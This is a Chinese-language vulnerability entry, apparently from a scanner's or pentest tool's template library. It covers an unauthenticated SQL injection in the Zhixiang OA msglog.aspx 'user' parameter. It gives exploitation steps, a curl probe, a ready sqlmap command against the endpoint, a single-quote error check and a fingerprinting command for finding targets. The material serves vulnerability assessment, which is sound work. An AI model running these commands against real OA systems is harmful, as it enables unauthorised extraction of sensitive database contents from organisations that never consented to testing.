---
id: ZHIXIANG-SQLI
title: 致翔OA msglog.aspx SQL注入漏洞
product: zhixiang-oa
vendor: 致翔软件
version_affected: "all versions"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["致翔OA", "致翔软件"]
---

## 漏洞描述

致翔OA 的 msglog.aspx 文件存在 SQL 注入漏洞，user 参数未经过滤直接拼接进 SQL 查询，攻击者无需认证即可注入 SQL 语句获取数据库敏感信息。

## 影响版本

- 致翔OA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行致翔OA

## 利用步骤

1. 确认目标为致翔OA
2. 在 user 参数中注入 SQL 语句
3. 使用 SQLmap 自动化利用

## Payload

```bash
# 手动注入测试
curl -s "http://target/mainpage/msglog.aspx?user=1"

# SQLmap 自动化利用
sqlmap -u "http://target/mainpage/msglog.aspx?user=1" -p user --batch
```

## 验证方法

```bash
# 检查 SQL 注入是否触发错误
curl -s "http://target/mainpage/msglog.aspx?user=1'" | grep -i "error\|sql\|syntax\|nvarchar"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "致翔"
```
